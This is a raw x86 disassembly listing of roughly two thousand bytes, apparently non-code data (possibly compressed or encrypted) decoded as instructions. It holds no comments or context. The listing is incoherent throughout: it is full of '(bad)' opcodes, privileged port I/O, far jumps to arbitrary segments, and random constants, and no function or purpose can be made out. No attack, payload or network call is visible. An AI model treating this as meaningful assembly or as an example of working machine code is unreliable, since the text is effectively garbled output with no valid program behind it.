  431d28:	xchg   BYTE PTR [edx+0x469b8b23],ch
  431d2e:	into   
  431d2f:	inc    eax
  431d30:	pop    eax
  431d31:	test   DWORD PTR [ebp+ebx*4+0x4d],0xf77d5656
  431d39:	jge    0x431d33
  431d3b:	ds aam 0x45
  431d3e:	jmp    0xa1cd473b
  431d43:	pop    esi
  431d44:	mov    esp,0x18986bae
  431d49:	cmp    cl,BYTE PTR [ebx-0x5b]
  431d4c:	cwde   
  431d4d:	and    edx,DWORD PTR [edi+0x60cd679c]
  431d53:	xchg   ecx,eax
  431d54:	lods   al,BYTE PTR ds:[esi]
  431d55:	pop    ebp
  431d56:	nop
  431d57:	cmp    BYTE PTR [ecx],0x44
  431d5a:	cmp    DWORD PTR [ebx-0x7b58b61],esi
  431d60:	fnop   
  431d62:	or     BYTE PTR [ecx+0xdca409c],bh
  431d68:	jge    0x431d96
  431d6a:	or     al,0x27
  431d6c:	inc    ebp
  431d6d:	shr    DWORD PTR [ebp-0x28],0x9d
  431d71:	or     DWORD PTR [ecx+eax*2+0x5a2f927],ecx
  431d78:	jg     0x431dc5
  431d7a:	mov    ah,al
  431d7c:	push   edx
  431d7d:	inc    edx
  431d7e:	test   al,0x80
  431d80:	pop    ds
  431d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431d82:	in     eax,dx
  431d83:	jge    0x431ddd
  431d85:	call   0x9c29:0xa7828a76
  431d8c:	sbb    esp,DWORD PTR [esi+0x78]
  431d8f:	out    0x6d,eax
  431d91:	retf   
  431d92:	retf   0x475f
  431d95:	add    bh,dl
  431d97:	lods   eax,DWORD PTR ds:[esi]
  431d98:	and    edi,DWORD PTR [edi-0x1]
  431d9b:	fst    st(4)
  431d9d:	xor    cl,ch
  431d9f:	add    dl,BYTE PTR [ebx-0xb0f47a6]
  431da5:	addr16 icebp 
  431da7:	mov    dh,0xba
  431da9:	inc    ebp
  431daa:	cmp    BYTE PTR [edi-0x75],dh
  431dad:	lds    edi,FWORD PTR [edi-0x7e]
  431db0:	fdiv   DWORD PTR [ebx+ecx*1+0x5d]
  431db4:	mov    ebx,0xf672246e
  431db9:	push   edi
  431dba:	mov    dl,0x66
  431dbc:	cmp    eax,0xfbc28364
  431dc1:	sub    eax,0x14b6dc66
  431dc6:	lods   eax,DWORD PTR ds:[esi]
  431dc7:	rol    DWORD PTR [ecx-0x7a],0x16
  431dcb:	mov    ?,WORD PTR [ecx+0x2c15f569]
  431dd1:	lea    eax,[esi-0x67]
  431dd4:	into   
  431dd5:	int    0xd1
  431dd7:	ficom  DWORD PTR [edx+0x20]
  431dda:	lahf   
  431ddb:	mov    dh,0xd6
  431ddd:	add    DWORD PTR [esi+edx*2-0x30b9cca5],0x1d
  431de5:	mov    eax,0xb9d2262c
  431dea:	xchg   ecx,eax
  431deb:	jp     0x431d6f
  431ded:	push   edx
  431dee:	sub    eax,0xb6a118f5
  431df3:	out    dx,al
  431df4:	cli    
  431df5:	mov    ebp,0x599b9573
  431dfa:	sbb    bh,bh
  431dfc:	addr16 call 0xb4a2:0x6fe4fa5a
  431e04:	cmc    
  431e05:	jge    0x431e64
  431e07:	or     al,0xe0
  431e09:	aas    
  431e0a:	or     ebx,DWORD PTR [esi+edi*4+0x25fb5082]
  431e11:	adc    al,0xf3
  431e13:	add    ch,BYTE PTR [edi]
  431e15:	lahf   
  431e16:	jg     0x431da6
  431e18:	repz mov bh,0xfc
  431e1b:	jge    0x431e9a
  431e1d:	data16 mov al,ds:0x63b4e706
  431e23:	ror    DWORD PTR [eax],0x8d
  431e26:	add    bl,BYTE PTR [edi+0x550f7395]
  431e2c:	pop    edx
  431e2d:	out    dx,eax
  431e2e:	mov    eax,0xb8cacebe
  431e33:	stos   DWORD PTR es:[edi],eax
  431e34:	cwde   
  431e35:	(bad)
  431e39:	sbb    cl,BYTE PTR [ecx+0x13b46818]
  431e3f:	push   ebx
  431e40:	inc    esi
  431e41:	inc    edx
  431e42:	inc    ecx
  431e43:	jg     0x431e8a
  431e45:	pmullw mm6,QWORD PTR [esp+eiz*8-0xb]
  431e4a:	scas   eax,DWORD PTR es:[edi]
  431e4b:	fild   DWORD PTR [esi-0x19]
  431e4e:	push   ebx
  431e4f:	aas    
  431e50:	xchg   ebx,eax
  431e51:	iret   
  431e52:	cs push eax
  431e54:	popf   
  431e55:	cmp    BYTE PTR [eax-0xf],al
  431e58:	sbb    ah,0x25
  431e5b:	sub    edx,ecx
  431e5d:	push   ds
  431e5e:	mov    dh,0xd6
  431e60:	shl    DWORD PTR [ecx-0xdcd3197],cl
  431e66:	xchg   DWORD PTR [ebp-0xb40d306],eax
  431e6c:	fs push ds
  431e6e:	out    0xa0,eax
  431e70:	inc    eax
  431e71:	data16 jnp 0x431e09
  431e74:	call   0xeb7f57a4
  431e79:	sbb    al,0xd8
  431e7b:	pop    ebx
  431e7c:	pop    esp
  431e7d:	adc    al,0xe3
  431e7f:	cdq    
  431e80:	jp     0x431eed
  431e82:	lods   eax,DWORD PTR ds:[esi]
  431e83:	fadd   QWORD PTR [edx-0x5dca4a60]
  431e89:	in     al,dx
  431e8a:	jbe    0x431ebf
  431e8c:	in     eax,dx
  431e8d:	fistp  DWORD PTR [esi*8-0x700c7ded]
  431e94:	int3   
  431e95:	mov    dl,0xe6
  431e97:	mov    es,ecx
  431e99:	jp     0x431ecf
  431e9b:	fisubr WORD PTR [eax+0x2b]
  431e9e:	xchg   ecx,eax
  431e9f:	fwait
  431ea0:	pop    ebx
  431ea1:	and    al,0x31
  431ea3:	xchg   edx,eax
  431ea4:	and    al,0x2b
  431ea6:	mov    dl,dh
  431ea8:	jno    0x431efd
  431eaa:	mov    BYTE PTR [ebx],ah
  431eac:	aas    
  431ead:	jge    0x431e3c
  431eaf:	shr    DWORD PTR [edi],0xed
  431eb2:	adc    al,0xe7
  431eb4:	and    BYTE PTR [ebx+ebx*8-0x25],bh
  431eb8:	daa    
  431eb9:	call   0x417cecdf
  431ebe:	add    dl,bl
  431ec0:	jae    0x431efc
  431ec2:	pop    es
  431ec3:	add    esi,DWORD PTR [edi+edi*1+0x666a01fa]
  431eca:	sub    eax,esi
  431ecc:	jmp    0x7f22:0x1e7f8a1a
  431ed3:	out    dx,eax
  431ed4:	mov    edi,0xdb97f9e2
  431ed9:	xor    dh,dh
  431edb:	mov    ebp,0x45f64c95
  431ee0:	push   0xfffffff9
  431ee2:	adc    DWORD PTR [ecx+eax*8+0x0],ebx
  431ee6:	leave  
  431ee7:	mov    ecx,0xbf761c25
  431eec:	js     0x431ede
  431eee:	add    eax,0x523116ec
  431ef3:	stc    
  431ef4:	jl     0x431e93
  431ef6:	xlat   BYTE PTR ds:[ebx]
  431ef7:	mov    bh,0xae
  431ef9:	in     eax,dx
  431efa:	scas   eax,DWORD PTR es:[edi]
  431efb:	aas    
  431efc:	lahf   
  431efd:	and    DWORD PTR [ebp-0x5515295b],ebx
  431f03:	pop    ds
  431f04:	inc    ecx
  431f05:	push   ss
  431f06:	out    0xb3,eax
  431f08:	pop    eax
  431f09:	or     DWORD PTR [esi],0xffffffac
  431f0c:	out    dx,al
  431f0d:	add    BYTE PTR [ecx+0x57040b93],dh
  431f13:	fwait
  431f14:	dec    eax
  431f15:	cmp    eax,0xc85b1e71
  431f1a:	inc    edx
  431f1b:	and    eax,0x4a2ca553
  431f20:	popa   
  431f21:	jp     0x431efa
  431f23:	xlat   BYTE PTR ds:[ebx]
  431f24:	icebp  
  431f25:	gs pushf 
  431f27:	sbb    al,0xde
  431f29:	cld    
  431f2a:	cli    
  431f2b:	cli    
  431f2c:	(bad)  
  431f2d:	test   al,0xfe
  431f2f:	jge    0x431f3b
  431f31:	popf   
  431f32:	inc    ecx
  431f33:	mov    ds:0x7da8f8b,eax
  431f38:	jne    0x431ebe
  431f3a:	stos   DWORD PTR es:[edi],eax
  431f3b:	mov    al,ds:0x3103a2bd
  431f40:	sbb    dh,BYTE PTR [ecx+0x18]
  431f43:	aad    0x81
  431f45:	pop    ecx
  431f46:	add    eax,0xac91d5d8
  431f4b:	inc    edx
  431f4c:	ins    DWORD PTR es:[edi],dx
  431f4d:	jmp    0x12ea1e67
  431f52:	mov    dh,0x54
  431f54:	out    0xa6,al
  431f56:	mov    dl,ch
  431f58:	mov    eax,ds:0x6f57b9f6
  431f5d:	or     BYTE PTR [edx+0x19a9e566],ah
  431f63:	jmp    0x1993c412
  431f68:	add    al,0xd5
  431f6a:	push   ss
  431f6b:	sub    cl,BYTE PTR [ebp-0x5d]
  431f6e:	push   cs
  431f6f:	shr    BYTE PTR [esi-0x1473ef5],0xb7
  431f76:	push   0x6a
  431f78:	lods   al,BYTE PTR ds:[esi]
  431f79:	cmp    bh,0x8a
  431f7c:	add    ch,BYTE PTR [eax-0x5c34d465]
  431f82:	(bad)  
  431f83:	dec    eax
  431f84:	sub    DWORD PTR [eax+eax*1-0x655fd5f3],esi
  431f8b:	xor    ch,BYTE PTR [edx-0x7a]
  431f8e:	popa   
  431f8f:	xchg   ebx,eax
  431f90:	lock mov ecx,0xc5078b0d
  431f96:	jb     0x43200f
  431f98:	aam    0xef
  431f9a:	pop    edx
  431f9b:	lods   eax,DWORD PTR ds:[esi]
  431f9c:	adc    eax,0x97c4fe39
  431fa1:	pop    ecx
  431fa2:	jnp    0x431fa1
  431fa4:	pop    ss
  431fa5:	cmp    ebx,edi
  431fa7:	fmul   QWORD PTR [edi]
  431fa9:	cmp    bh,bh
  431fab:	fmul   st(7),st
  431fad:	mov    eax,0xc61f13fc
  431fb2:	push   0xffffffef
  431fb4:	(bad)  
  431fb5:	push   eax
  431fb6:	adc    BYTE PTR [eax+0x63],dh
  431fb9:	pop    esp
  431fba:	and    al,0x7a
  431fbc:	cld    
  431fbd:	sub    BYTE PTR [ebx-0x19],dl
  431fc0:	into   
  431fc1:	shl    DWORD PTR [ebx-0x33],cl
  431fc4:	jp     0x431f78
  431fc6:	push   ecx
  431fc7:	loope  0x431fc3
  431fc9:	sub    eax,0x7f9e485b
  431fce:	cwde   
  431fcf:	rcr    dl,1
  431fd1:	ss es push cs
  431fd4:	and    eax,0x4831d8e9
  431fd9:	ss adc eax,0xe2f76ec3
  431fdf:	jae    0x431f9f
  431fe1:	popf   
  431fe2:	jl     0x432008
  431fe4:	sub    BYTE PTR [ebx+0x778152e7],0x35
  431feb:	dec    esi
  431fec:	cmc    
  431fed:	mov    ebp,0xb73a5a9e
  431ff2:	ins    BYTE PTR es:[edi],dx
  431ff3:	add    dh,dh
  431ff5:	jbe    0x431ff1
  431ff7:	stc    
  431ff8:	(bad)  [ebx]
  431ffa:	mov    edi,0x917694c6
  431fff:	xlat   BYTE PTR ds:[ebx]
  432000:	push   es
  432001:	xchg   ebx,eax
  432002:	cmp    al,0xff
  432004:	jle    0x431fe2
  432006:	popf   
  432007:	jge    0x432041
  432009:	pushf  
  43200a:	in     eax,dx
  43200b:	sub    al,0xd
  43200d:	dec    DWORD PTR [edi]
  43200f:	push   es
  432010:	push   DWORD PTR [ebp+0x4417f702]
  432016:	mov    al,0xe6
  432018:	jmp    0x3c7e:0x9e538c93
  43201f:	sahf   
  432020:	mov    ch,0x38
  432022:	jl     0x431ff3
  432024:	adc    BYTE PTR [ebp+edi*2-0x6a],dh
  432028:	cdq    
  432029:	enter  0x89f,0xd9
  43202d:	popf   
  43202e:	aam    0xaa
  432030:	mov    dl,0xd4
  432032:	int    0x3d
  432034:	adc    al,0x97
  432036:	sahf   
  432037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432038:	nop
  432039:	push   cs
  43203a:	or     ebp,ebp
  43203c:	sub    BYTE PTR [ebx+0x77],ah
  43203f:	stc    
  432040:	dec    eax
  432041:	mov    esp,DWORD PTR [edx+0x57]
  432044:	gs jno 0x432072
  432047:	in     eax,0x5c
  432049:	cmp    eax,0x79b66448
  43204e:	les    esp,FWORD PTR [ebx]
  432050:	into   
  432051:	push   ecx
  432052:	sub    BYTE PTR [edx],cl
  432054:	scas   eax,DWORD PTR es:[edi]
  432055:	hlt    
  432056:	xor    eax,0x817d3d33
  43205b:	fdivp  st(6),st
  43205d:	int    0xc2
  43205f:	jg     0x431fe8
  432061:	jmp    0x91501f4e
  432066:	stc    
  432067:	jg     0x432080
  432069:	push   ds
  43206a:	sti    
  43206b:	xor    WORD PTR [ebp+ebx*8+0x147c9a04],ax
  432073:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  432075:	enter  0x7edd,0x37
  432079:	xchg   DWORD PTR [edi+0x45f7d74e],ecx
  43207f:	fwait
  432080:	jge    0x4320f2
  432082:	dec    esi
  432083:	pop    edi
  432084:	pop    edi
  432085:	adc    eax,0x51d6d7fd
  43208a:	adc    edi,DWORD PTR [esi-0x67b9cb5d]
  432090:	sub    DWORD PTR [eax],ecx
  432092:	aas    
  432093:	lods   al,BYTE PTR ds:[esi]
  432094:	jnp    0x43210a
  432096:	xor    eax,0x42b8385d
  43209b:	pusha  
  43209c:	pop    edx
  43209d:	hlt    
  43209e:	lahf   
  43209f:	mov    bl,0xba
  4320a1:	xchg   edi,eax
  4320a2:	push   edi
  4320a3:	inc    ebx
  4320a4:	inc    ebx
  4320a5:	ret    0xe834
  4320a8:	pushf  
  4320a9:	div    bl
  4320ab:	rcr    BYTE PTR [esi-0x98653d3],0x1
  4320b2:	bound  ebp,QWORD PTR [edi]
  4320b4:	jl     0x4320c7
  4320b6:	fbstp  TBYTE PTR ds:0x89f6477f
  4320bc:	jg     0x432061
  4320be:	jo     0x43213c
  4320c0:	adc    al,0x53
  4320c2:	mov    bl,0x5d
  4320c4:	clc    
  4320c5:	mov    esi,0xcc4d49b
  4320ca:	idiv   BYTE PTR [esi]
  4320cc:	pop    es
  4320cd:	push   ebx
  4320ce:	dec    edi
  4320cf:	inc    ebp
  4320d0:	mov    cl,0xb6
  4320d2:	pop    eax
  4320d3:	dec    ecx
  4320d4:	popf   
  4320d5:	retf   
  4320d6:	xchg   edx,eax
  4320d7:	adc    edx,esp
  4320d9:	sar    bl,cl
  4320db:	scas   al,BYTE PTR es:[edi]
  4320dc:	adc    BYTE PTR [ecx],dh
  4320de:	(bad)  [edi]
  4320e0:	pop    ebx
  4320e1:	rol    BYTE PTR [eax+0x7c],0xb2
  4320e5:	xchg   BYTE PTR [ebx+0x204246c3],bh
  4320eb:	dec    esi
  4320ec:	push   esi
  4320ed:	mov    dh,0xd1
  4320ef:	out    0xf3,al
  4320f1:	loope  0x43210e
  4320f3:	lock nop
  4320f5:	sahf   
  4320f6:	iret   
  4320f7:	sar    DWORD PTR [ebp+0x65],cl
  4320fa:	inc    eax
  4320fb:	mov    WORD PTR [eax+0x4870eaf0],cs
  432101:	mov    esp,0x78ec8c70
  432106:	call   0x9660:0xff0e7458
  43210d:	call   0xb71d5775
  432112:	je     0x432165
  432114:	ss or  dl,dl
  432117:	pop    edx
  432118:	mov    ebx,0x6aefab05
  43211d:	cmp    ecx,0x1424a26
  432123:	inc    esi
  432124:	ja     0x4320e3
  432126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432127:	(bad)  
  432128:	pushf  
  432129:	loope  0x432112
  43212b:	outs   dx,BYTE PTR ds:[esi]
  43212c:	pop    ss
  43212d:	and    esi,DWORD PTR [eax+0x19]
  432130:	jbe    0x43211d
  432132:	jbe    0x4320be
  432134:	ret    0xd3e7
  432137:	push   edx
  432139:	sbb    BYTE PTR [esi+0x5c2857fe],dl
  43213f:	jle    0x43216c
  432141:	mov    cl,0xf4
  432143:	adc    edx,ebx
  432145:	(bad)  
  432146:	test   cl,cl
  432148:	dec    esi
  432149:	dec    esi
  43214a:	jecxz  0x4321b8
  43214c:	out    dx,al
  43214d:	xchg   esp,eax
  43214e:	mov    ebp,0xcd6188ac
  432153:	adc    ebx,DWORD PTR [ecx]
  432155:	cdq    
  432156:	scas   eax,DWORD PTR es:[edi]
  432157:	out    0x6c,eax
  432159:	test   bh,dl
  43215b:	je     0x43216f
  43215d:	sbb    ebx,DWORD PTR [esi]
  43215f:	(bad)  
  432160:	and    ebp,DWORD PTR [ebx+0x6d]
  432163:	xchg   edx,eax
  432164:	fcomip st,st(3)
  432166:	icebp  
  432167:	sbb    BYTE PTR [esi-0xd23994a],dh
  43216d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43216e:	dec    ebp
  43216f:	mov    ah,0xf2
  432171:	scas   al,BYTE PTR es:[edi]
  432172:	imul   esp,DWORD PTR [ebx+0x7f271530],0x6e
  432179:	push   cs
  43217a:	mov    bh,0xa3
  43217c:	adc    cl,0x5c
  43217f:	(bad)  
  432180:	shl    BYTE PTR [edx+0x24],cl
  432183:	ja     0x4321df
  432185:	out    dx,al
  432186:	jae    0x43217b
  432188:	cmc    
  432189:	add    al,0x2
  43218b:	mov    bh,0x63
  43218d:	stc    
  43218e:	(bad)  
  432190:	in     al,dx
  432191:	inc    esi
  432193:	aas    
  432194:	sub    eax,0x5955f077
  432199:	cdq    
  43219a:	xchg   ecx,eax
  43219b:	adc    eax,0x834331fa
  4321a0:	ret    
  4321a1:	stos   DWORD PTR es:[edi],eax
  4321a2:	(bad)  [edx+ebp*1+0x7be0a798]
  4321a9:	inc    esp
  4321aa:	(bad)  
  4321ac:	les    ecx,FWORD PTR [edx]
  4321ae:	out    0xab,eax
  4321b0:	loopne 0x43216f
  4321b2:	stos   BYTE PTR es:[edi],al
  4321b3:	je     0x432209
  4321b5:	mov    cl,0xb7
  4321b7:	sbb    BYTE PTR [ebp-0x22f54f5a],cl
  4321bd:	test   eax,0x68d05849
  4321c2:	mov    WORD PTR [edx+0x1b3eae7d],gs
  4321c8:	push   eax
  4321c9:	popf   
  4321ca:	std    
  4321cb:	scas   al,BYTE PTR es:[edi]
  4321cc:	sbb    al,0x15
  4321ce:	mov    ch,0x32
  4321d0:	mov    bh,0xb8
  4321d2:	inc    esp
  4321d3:	jecxz  0x4321bd
  4321d5:	rol    DWORD PTR [edi-0x5d],0xf8
  4321d9:	inc    eax
  4321da:	add    eax,0x91d654f7
  4321df:	cmp    dl,BYTE PTR [edi+0x56]
  4321e2:	cmp    DWORD PTR [ebx],eax
  4321e4:	mov    ah,BYTE PTR [edx]
  4321e6:	sub    BYTE PTR [edx+0x34b0a6a0],bl
  4321ec:	rol    DWORD PTR [eax+0x15],1
  4321ef:	sub    cl,BYTE PTR [ebx+0x50]
  4321f2:	jge    0x4321cb
  4321f4:	(bad)  
  4321f5:	pop    esi
  4321f6:	mov    ch,0x92
  4321f8:	scas   al,BYTE PTR es:[edi]
  4321f9:	pop    ds
  4321fa:	adc    esi,ebp
  4321fc:	ins    BYTE PTR es:[edi],dx
  4321fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4321fe:	sti    
  4321ff:	aad    0x17
  432201:	jmp    0xf007:0xef697dbc
  432208:	ins    DWORD PTR es:[edi],dx
  432209:	cli    
  43220a:	sub    DWORD PTR [ebx+0x2648fb63],ecx
  432210:	and    ah,BYTE PTR [ebp+eax*8-0x20a8c50d]
  432217:	dec    esp
  432218:	(bad)  [esi+0x7f9991d7]
  43221e:	push   ebp
  43221f:	ss dec ebp
  432221:	mov    esp,0xa31cf442
  432226:	(bad)  
  432227:	dec    esi
  432228:	popa   
  432229:	aaa    
  43222a:	sbb    esi,DWORD PTR [eax]
  43222c:	call   0x7368:0x88c4784c
  432233:	or     al,0xb5
  432235:	mov    dh,0x53
  432237:	repz adc ebx,DWORD PTR [esi-0x2a]
  43223b:	pop    edi
  43223c:	sti    
  43223d:	jne    0x432269
  43223f:	test   eax,0xad0cd40b
  432244:	push   esp
  432245:	xchg   edx,eax
  432246:	mov    bl,0x58
  432248:	dec    ebp
  432249:	jb     0x4322a2
  43224b:	(bad)  
  43224c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43224d:	sahf   
  43224e:	das    
  43224f:	xor    BYTE PTR [edx-0x2d],bh
  432252:	mov    ebp,0xfaa9a2d4
  432257:	sti    
  432258:	imul   ecx,edi,0xfffffffc
  43225b:	jg     0x432222
  43225d:	xor    ebx,ebp
  43225f:	mov    bh,0x70
  432261:	cwde   
  432262:	loop   0x43225d
  432264:	xchg   DWORD PTR [eax+0x5b],ecx
  432267:	pop    edx
  432268:	sbb    DWORD PTR [edi],edi
  43226a:	cld    
  43226b:	adc    edi,esp
  43226d:	std    
  43226e:	mov    bh,0xa2
  432270:	add    esi,ebp
  432272:	fsubr  st,st(4)
  432274:	adc    bl,dh
  432276:	lock and cl,dl
  432279:	leave  
  43227a:	mov    ds:0x93563a04,eax
  43227f:	mov    cs,WORD PTR [edx+eiz*8-0x15]
  432283:	mov    ebp,0x9da78b0a
  432288:	cdq    
  432289:	push   edi
  43228a:	mov    edi,0xa713aacf
  43228f:	mov    DWORD PTR [esi+0x7cdffc08],esi
  432295:	aaa    
  432296:	xchg   ebp,eax
  432297:	pop    es
  432298:	dec    DWORD PTR [edi+esi*8-0x7c640085]
  43229f:	das    
  4322a0:	ffree  st(7)
  4322a2:	pusha  
  4322a3:	inc    edi
  4322a5:	cdq    
  4322a6:	pop    ecx
  4322a7:	fmul   QWORD PTR [ebx-0x48]
  4322aa:	stc    
  4322ab:	sub    al,BYTE PTR [ecx+0x20]
  4322ae:	dec    ebp
  4322af:	sbb    BYTE PTR [esi-0x24],0xe4
  4322b3:	or     esi,DWORD PTR [ebx]
  4322b5:	xchg   esp,eax
  4322b6:	ror    DWORD PTR [edi],cl
  4322b8:	mov    bl,0x14
  4322ba:	cdq    
  4322bb:	mov    al,ds:0x3aaed56f
  4322c0:	pop    esp
  4322c1:	mov    dh,0xd9
  4322c3:	mov    ah,0x11
  4322c5:	call   0xdd8626fd
  4322ca:	adc    al,0xc5
  4322cc:	and    BYTE PTR [esp+ebp*1-0x364ef49],dl
  4322d3:	and    DWORD PTR [ebp-0x21],esp
  4322d6:	pop    ebx
  4322d7:	call   0xa18c0146
  4322dc:	cmp    al,0x4c
  4322de:	sub    BYTE PTR [ebx+eiz*4+0x7a],ch
  4322e2:	jo     0x432272
  4322e4:	cmp    DWORD PTR [ebx+0x1edcb13e],0x6a
  4322eb:	imul   eax,DWORD PTR [ebp+0x23836850],0x5507bcd4
  4322f5:	or     BYTE PTR [edx+edi*1+0x4123ab01],ah
  4322fc:	aad    0xee
  4322fe:	pop    ebx
  4322ff:	sbb    eax,0xec5765ef
  432304:	test   DWORD PTR [edx],ecx
  432306:	pop    eax
  432307:	mov    ch,0xeb
  432309:	or     bl,bh
  43230b:	scas   al,BYTE PTR es:[edi]
  43230c:	out    dx,eax
  43230d:	mov    cl,0x32
  43230f:	(bad)  
  432310:	imul   eax,esp,0xfffffff3
  432313:	idiv   DWORD PTR [esi]
  432315:	cmc    
  432316:	retf   
  432317:	mov    edx,0x48399494
  43231c:	out    dx,al
  43231d:	(bad)  
  43231e:	aas    
  43231f:	aam    0xe3
  432321:	push   ss
  432322:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432323:	mov    eax,0xf0ab1a50
  432328:	addr16 icebp 
  43232a:	(bad)  
  43232b:	out    0xb6,al
  43232d:	or     bh,BYTE PTR [esi-0x819e1cb]
  432333:	mov    dh,BYTE PTR [ecx-0x528fa7d5]
  432339:	xchg   edx,eax
  43233a:	jge    0x432374
  43233c:	xchg   esp,eax
  43233d:	and    DWORD PTR [ebx+eax*8-0x3b3417dd],esi
  432344:	in     al,dx
  432345:	fiadd  WORD PTR [eax*4-0x64216eb4]
  43234c:	or     BYTE PTR [edi+ebx*4-0x66],0xc3
  432351:	loope  0x4323c5
  432353:	arpl   WORD PTR [eax-0x6fa21528],bp
  432359:	mov    ah,0xc6
  43235b:	xor    cl,bh
  43235d:	fs pop ecx
  43235f:	not    ch
  432361:	pop    esi
  432362:	pop    ds
  432363:	or     al,0x6b
  432365:	jae    0x43233b
  432367:	mov    BYTE PTR [edi],bl
  432369:	popf   
  43236a:	and    bl,BYTE PTR [ecx+0x1a]
  43236d:	mov    ds:0x718c6b45,eax
  432372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432373:	ret    0xf7a6
  432376:	in     eax,dx
  432377:	xor    DWORD PTR es:[ebx],ebp
  43237a:	mov    ah,0x6c
  43237c:	sti    
  43237d:	fwait
  43237e:	jmp    0x4323ad
  432380:	mov    bh,0xbc
  432382:	cmp    eax,0x773f12d7
  432387:	adc    BYTE PTR [ebx+0x28447ed7],0x9b
  43238e:	lahf   
  43238f:	out    0xfb,al
  432391:	pop    edi
  432392:	xchg   DWORD PTR ds:0x614b19bc,ebp
  432398:	adc    eax,0xa403e1b9
  43239d:	pop    esi
  43239e:	jge    0x4323b0
  4323a0:	jmp    0x432390
  4323a2:	sbb    eax,esp
  4323a4:	mov    al,ds:0x2e66491b
  4323a9:	shr    BYTE PTR [ebp+edx*1-0x1a9537f0],1
  4323b0:	pop    ss
  4323b1:	ins    DWORD PTR es:[edi],dx
  4323b2:	cmc    
  4323b3:	jae    0x4323b3
  4323b5:	pop    edx
  4323b6:	mov    cl,0x56
  4323b8:	aaa    
  4323b9:	rcl    BYTE PTR [esi],1
  4323bb:	mov    eax,ds:0x788a8658
  4323c0:	cmc    
  4323c1:	repz ret 0x37f3
  4323c5:	ja     0x432417
  4323c7:	dec    ecx
  4323c8:	or     edi,DWORD PTR [edx-0x75]
  4323cb:	(bad)  
  4323cc:	mov    cl,0x5a
  4323ce:	das    
  4323cf:	into   
  4323d0:	jo     0x432382
  4323d2:	cli    
  4323d3:	ins    DWORD PTR es:[edi],dx
  4323d4:	mov    dl,0x77
  4323d6:	sub    ah,BYTE PTR es:[ebx-0x1ae8abb5]
  4323dd:	cmp    eax,0xe4c8828d
  4323e2:	call   0x214d:0xb1956cd5
  4323e9:	push   es
  4323ea:	cs stc 
  4323ec:	cmp    ch,BYTE PTR [esi]
  4323ee:	stos   DWORD PTR es:[edi],eax
  4323ef:	xchg   ebx,eax
  4323f0:	mov    ebp,0x6bebdb2d
  4323f5:	test   al,0x79
  4323f7:	jmp    FWORD PTR [ecx+0x1a]
  4323fa:	xor    al,0x6d
  4323fc:	inc    edx
  4323fd:	pop    edi
  4323fe:	sar    DWORD PTR [eax],cl
  432400:	(bad)  
  432401:	jecxz  0x43247a
  432403:	push   0xda2ba31c
  432408:	lods   eax,DWORD PTR ds:[esi]
  432409:	shr    dh,cl
  43240b:	aad    0x4
  43240d:	call   0x7d8a3e37
  432412:	sub    eax,DWORD PTR [edi-0x63]
  432415:	sub    edi,DWORD PTR [ebp+0x54]
  432418:	mov    cl,0x1d
  43241a:	mov    edi,DWORD PTR [esi+0x4d]
  43241d:	test   DWORD PTR [edx],ebx
  43241f:	aam    0x3c
  432421:	retf   
  432422:	call   0xa951:0xba82006e
  432429:	and    eax,DWORD PTR [eax]
  43242b:	adc    eax,0xe4b353bc
  432430:	push   edi
  432431:	inc    edx
  432432:	or     BYTE PTR [ebx],ch
  432434:	or     eax,0xbd20a1f8
  432439:	mov    bh,dl
  43243b:	mov    ebx,0xd548f068
  432440:	and    cl,BYTE PTR [edx-0x5b]
  432443:	add    al,0xab
  432445:	pop    esi
  432446:	icebp  
  432447:	mov    ah,BYTE PTR [esi]
  432449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43244a:	jne    0x43244d
  43244c:	push   edx
  43244d:	je     0x432492
  43244f:	xchg   ebp,eax
  432450:	lods   eax,DWORD PTR ds:[esi]
  432451:	stos   BYTE PTR es:[edi],al
  432452:	out    dx,al
  432453:	xor    eax,0x9d1efd56
  432458:	cli    
  432459:	out    0xac,eax
  43245b:	cli    
  43245c:	mov    edi,0x92e75e69
  432461:	nop
  432462:	xchg   ebx,eax
  432463:	mov    esi,0x66c887f9
  432468:	out    0xb1,al
  43246a:	sbb    ch,ah
  43246c:	ror    DWORD PTR ds:0x7f1ccc3d,1
  432472:	add    dl,BYTE PTR [ebx-0x1b]
  432475:	or     DWORD PTR [edx+0x3a388d86],ebp
  43247b:	inc    ebp
  43247c:	and    DWORD PTR [esi-0xa],esp
  43247f:	aad    0xeb
  432481:	int    0x5d
  432483:	xor    DWORD PTR [edx],0x8527a30b
  432489:	dec    edi
  43248a:	out    0x29,al
  43248c:	out    0x8d,eax
  43248e:	hlt    
  43248f:	outs   dx,BYTE PTR ds:[esi]
  432490:	in     eax,dx
  432491:	daa    
  432492:	adc    DWORD PTR [ecx+0x45bdb7d1],ebp
  432498:	mov    eax,0x85989df7
  43249d:	sti    
  43249e:	fwait
  43249f:	mov    WORD PTR [esi],cs
  4324a1:	retf   0xa171
  4324a4:	add    eax,0xb2da5976
  4324a9:	jbe    0x4324e9
  4324ab:	cmp    eax,0xd3e0f94f
  4324b0:	mov    esp,0x847db1fc
  4324b5:	data16 xchg si,ax
  4324b8:	(bad)  
  4324b9:	push   edi
  4324ba:	pop    esi
  4324bb:	xchg   edx,eax
  4324bc:	xchg   edi,eax
  4324bd:	clc    
  4324be:	sti    
  4324bf:	repnz mov ds:0x47f81ee4,eax
  4324c5:	or     ch,BYTE PTR [ebp-0x49]
  4324c8:	loopne 0x432486
  4324ca:	hlt    
  4324cb:	xor    dh,BYTE PTR es:[ecx-0x1098ece8]
  4324d2:	(bad)  
  4324d3:	popa   
  4324d4:	je     0x432538
  4324d6:	rol    dh,cl
  4324d8:	aaa    
  4324d9:	xchg   edi,eax
  4324da:	dec    ebx
  4324db:	mov    dl,0x6
  4324dd:	add    DWORD PTR [ecx-0x3253eeef],esp
  4324e3:	in     eax,dx
  4324e4:	je     0x432494
  4324e6:	mov    esi,0x29f18a93
  4324eb:	(bad)  
  4324ec:	idiv   ebp
  4324ee:	add    esp,DWORD PTR [ebp+0x68301bee]
  4324f4:	push   ecx
  4324f5:	in     al,0xca
